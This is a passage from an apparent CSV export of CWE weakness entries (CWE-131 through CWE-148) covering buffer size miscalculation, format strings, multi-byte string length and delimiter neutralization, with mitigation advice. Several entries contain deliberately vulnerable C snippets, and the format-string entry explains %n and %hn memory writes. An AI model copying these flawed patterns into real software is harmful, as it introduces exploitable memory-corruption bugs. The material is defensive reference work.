'&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){/* encode to &lt; */}else dst_buf[dst_index++] = user_supplied_string[i];}return dst_buf;}The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.Example 4The following code is intended to read an incoming packet from a socket and extract one or more headers.(bad code)Example Language:CDataPacket *packet;int numHeaders;PacketHeader *headers;sock=AcceptSocketConnection();ReadPacket(packet, sock);numHeaders =packet->headers;if (numHeaders > 100) {ExitError(""too many headers!"");}headers = malloc(numHeaders * sizeof(PacketHeader);ParsePacketHeaders(packet, headers);The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow.Example 5The following code attempts to save three different identification numbers into an array. The array is allocated from memory using a call to malloc().(bad code)Example Language:Cint *id_sequence;/* Allocate space for an array of three ids. */id_sequence = (int*) malloc(3);if (id_sequence == NULL) exit(1);/* Populate the id array. */id_sequence[0] = 13579;id_sequence[1] = 24680;id_sequence[2] = 97531;The problem with the code above is the value of the size parameter used during the malloc() call. It uses a value of '3' which by definition results in a buffer of three bytes to be created. However the intention was to create a buffer that holds three ints, and in C, each int requires 4 bytes worth of memory, so an array of 12 bytes is needed, 4 bytes for each int. Executing the above code could result in a buffer overflow as 12 bytes of data is being saved into 3 bytes worth of allocated space. The overflow would occur during the assignment of id_sequence[0] and would continue with the assignment of id_sequence[1] and id_sequence[2].The malloc() call could have used '3*sizeof(int)' as the value for the size parameter in order to allocate the correct amount of space required to store the three ints.","Phase:  ImplementationWhen allocating a buffer for the purpose of transforming, converting, or encoding an input, allocate enough memory to handle the largest possible encoding. For example, in a routine that converts ""&"" characters to ""&amp;"" for HTML entity encoding, the output buffer needs to be at least 5 times as large as the input buffer.Phase:  ImplementationUnderstand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, ""not-a-number"" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.Phase:  ImplementationStrategy:  Input ValidationPerform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationWhen processing structured incoming data containing a size field followed by raw data, identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).Phase:  ImplementationWhen allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.Phase:  ImplementationReplace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.Effectiveness: ModerateNote:This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131). Additionally, this only addresses potential overflow issues. Resource consumption / exhaustion issues are still possible.Phase:  ImplementationUse sizeof() on the appropriate data type to avoidCWE-467.Phase:  ImplementationUse the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity. This will simplify validation and will reduce surprises related to unexpected casting.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Use libraries or frameworks that make it easier to handle numbers without unexpected consequences, or buffer allocation routines that automatically track buffer size.Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  ImplementationStrategy:  Compilation or Build HardeningExamine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-132: DEPRECATED: Miscalculated Null Termination,This entry has been deprecated because it was a duplicate ofCWE-170. All content has been transferred toCWE-170.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: String Errors,Weaknesses in this category are related to the creation and modification of strings.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-134: Use of Externally-Controlled Format String,"The product uses a function that accepts a format string as an argument, but the format string originates from an external source.","Scope: Confidentiality, Impact: Technical Impact:Read MemoryFormat string problems allow for information disclosure which can severely simplify exploitation of the program., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsFormat string problems can result in the execution of arbitrary code., Likelihood: ","Example 1The following program prints a string provided as an argument.(bad code)Example Language:C#include <stdio.h>void printWrapper(char *string) {printf(string);}int main(int argc, char **argv) {char buf[5012];memcpy(buf, argv[1], 5012);printWrapper(argv[1]);return (0);}The example is exploitable, because of the call to printf() in the printWrapper() function. Note: The stack buffer was added to make exploitation more simple.Example 2The following code copies a command line argument into a buffer using snprintf().(bad code)Example Language:Cint main(int argc, char **argv){char buf[128];...snprintf(buf,128,argv[1]);}This code allows an attacker to view the contents of the stack and write to the stack using a command line argument containing a sequence of formatting directives. The attacker can read from the stack by providing more formatting directives, such as %x, than the function takes as arguments to be formatted. (In this example, the function takes no arguments to be formatted.) By using the %n formatting directive, the attacker can write to the stack, causing snprintf() to write the number of bytes output thus far to the specified argument (rather than reading a value from the argument, which is the intended behavior). A sophisticated version of this attack will use four staggered writes to completely control the value of a pointer on the stack.Example 3Certain implementations make more advanced attacks even easier by providing format directives that control the location in memory to read from or write to. An example of these directives is shown in the following code, written for glibc:(bad code)Example Language:Cprintf(""%d %d %1$d %1$d\n"", 5, 9);This code produces the following output: 5 9 5 5 It is also possible to use half-writes (%hn) to accurately control arbitrary DWORDS in memory, which greatly reduces the complexity needed to execute an attack that would otherwise require four staggered writes, such as the one mentioned in the first example.","Phase:  RequirementsChoose a language that is not subject to this flaw.Phase:  ImplementationEnsure that all format string functions are passed a static string which cannot be controlled by the user, and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings. [REF-116] [REF-117]Phase:  Build and CompilationRun compilers and linkers with high warning levels, since they may detect incorrect usage."
CWE-135: Incorrect Calculation of Multi-Byte String Length,The product does not correctly calculate the length of strings that can contain wide or multi-byte characters.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThis weakness may lead to a buffer overflow. Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service., Likelihood: ; Scope: AvailabilityConfidentiality, Impact: Technical Impact:Read Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read MemoryIn the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences., Likelihood: ","Example 1The following example would be exploitable if any of the commented incorrect malloc calls were used.(bad code)Example Language:C#include <stdio.h>#include <strings.h>#include <wchar.h>int main() {wchar_t wideString[] = L""The spazzy orange tiger jumped "" \""over the tawny jaguar."";wchar_t *newString;printf(""Strlen() output: %d\nWcslen() output: %d\n"",strlen(wideString), wcslen(wideString));/* Wrong because the number of chars in a string isn't related to its length in bytes //newString = (wchar_t *) malloc(strlen(wideString));*//* Wrong because wide characters aren't 1 byte long! //newString = (wchar_t *) malloc(wcslen(wideString));*//* Wrong because wcslen does not include the terminating null */newString = (wchar_t *) malloc(wcslen(wideString) * sizeof(wchar_t));/* correct! */newString = (wchar_t *) malloc((wcslen(wideString) + 1) * sizeof(wchar_t));/* ... */}The output from the printf() statement would be:(result)Strlen() output: 0Wcslen() output: 53","Phase:  ImplementationStrategy:  Input ValidationAlways verify the length of the string unit character.Phase:  ImplementationStrategy:  Libraries or FrameworksUse length computing functions (e.g. strlen, wcslen, etc.) appropriately with their equivalent type (e.g.: byte, wchar_t, etc.)"
CWE CATEGORY: Type Errors,Weaknesses in this category are caused by improper data type transformation or improper handling of multiple data types.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Data Neutralization Issues,Weaknesses in this category are related to the creation or neutralization of data using an incorrect format.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-138: Improper Neutralization of Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.","Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Alter Execution Logic; DoS: Crash, Exit, or Restart, Likelihood: ",无示范例子,"Phase:  ImplementationDevelopers should anticipate that special elements (e.g. delimiters, symbols) will be injected into input vectors of their product. One defense is to create an allowlist (e.g. a regular expression) that defines valid input according to the requirements specifications. Strictly filter any input that does not match against the allowlist. Properly encode your output, and quote any elements that have special meaning to the component with which you are communicating.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationUse and specify an appropriate output encoding to ensure that the special elements are well-defined. A normal byte sequence in one encoding could be a special element in another.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88)."
CWE CATEGORY: DEPRECATED: General Special Element Problems,"This entry has been deprecated. It is a leftover from PLOVER, butCWE-138is a more appropriate mapping.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-140: Improper Neutralization of Delimiters,The product does not neutralize or incorrectly neutralizes delimiters.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationDevelopers should anticipate that delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-141: Improper Neutralization of Parameter/Argument Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as parameter or argument delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that parameter/argument delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-142: Improper Neutralization of Value Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as value delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that value delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-143: Improper Neutralization of Record Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as record delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that record delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-144: Improper Neutralization of Line Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as line delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that line delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-145: Improper Neutralization of Section Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as section delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that section delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-146: Improper Neutralization of Expression/Command Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as expression or command delimiters when they are sent to a downstream component.","Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Alter Execution Logic, Likelihood: ",无示范例子,"Developers should anticipate that inter-expression and inter-command delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-147: Improper Neutralization of Input Terminators,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as input terminators when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that terminators will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-148: Improper Neutralization of Input Leaders,"The product does not properly handle when a leading character or sequence (""leader"") is missing or malformed, or if multiple leaders are used when only one should be allowed.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that leading characters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been 